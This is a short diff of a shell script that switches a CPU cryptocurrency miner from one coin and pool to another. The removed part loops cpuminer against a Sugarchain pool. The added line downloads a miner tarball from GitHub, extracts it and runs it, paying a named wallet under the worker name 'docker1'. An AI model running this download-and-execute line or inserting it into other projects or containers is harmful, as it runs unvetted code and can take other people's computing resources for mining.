@@ -1,5 +1,1 @@
-#!/bin/sh
-while [ 1 ]; do
-./cpuminer -a yespowersugar -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1q2dgtvyj69an3der2f3jrz72w62vjfma88nt9nt -t 12 -q
-sleep 10
-done
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a cpupower -o stratum+tcp://stratum-asia.rplant.xyz:7029 -t 8 --cpu-priority 5 -q -u CTsGecYmxE7Nb93PZQ5me9sa5nxjqLbDMU.docker1
